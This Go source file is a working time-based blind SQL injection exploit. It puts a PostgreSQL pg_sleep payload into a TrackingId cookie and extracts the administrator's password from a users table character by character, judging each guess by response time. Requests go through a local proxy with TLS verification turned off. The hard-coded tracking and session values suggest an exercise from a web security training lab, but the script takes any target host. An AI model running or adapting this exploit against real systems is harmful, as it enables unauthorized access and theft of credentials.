package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"time"
)

const (
	proxy_server_http  = "http://127.0.0.1:8080"
	proxy_server_https = "http://127.0.0.1:8080"
)

func main() {

	hostname := flag.String("host", "", "Provide the http web server, Ex.: https://www.example.com")
	flag.Parse()

	if *hostname == "" {
		flag.Usage()
		os.Exit(1)
	}

	getRequest(*hostname, proxy_server_http, proxy_server_https)

}

func getRequest(hostname, proxy_server_http, proxy_server_https string) {
	os.Setenv("HTTP_PROXY", proxy_server_http)
	os.Setenv("HTTPS_PROXY", proxy_server_https)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           http.ProxyFromEnvironment,
	}
	client := &http.Client{
		CheckRedirect: http.DefaultClient.CheckRedirect,
		Transport:     tr,
	}

	alphaNum := []rune{'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9'}

	for i := 1; i <= 20; i++ {
		for _, char := range alphaNum {
			letter := fmt.Sprintf("%c",char)
			time.Sleep(200 * time.Millisecond)
			data := fmt.Sprintf("TrackingId=DjpdmBjgEVT07vq5'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,%d,1)='%s')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;+session=3xoubU9Jt465IS9APR4nLu74HpXlUKk8", i,letter)
			finalUrl := hostname + "/"
			req, err := http.NewRequest(http.MethodGet, finalUrl, nil)
			if err != nil {
				panic(err)
			}
			req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36")
			req.Header.Add("Cookie", data)
			time_start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				panic(err)
			}
			defer resp.Body.Close()

			if time.Since(time_start).Seconds() >= 10 {
				fmt.Println(resp.Status, " - SeqNumber: ", i, " Letter: ",letter, " - Resp Time:", time.Since(time_start).Seconds())
			}

		}
	}
}
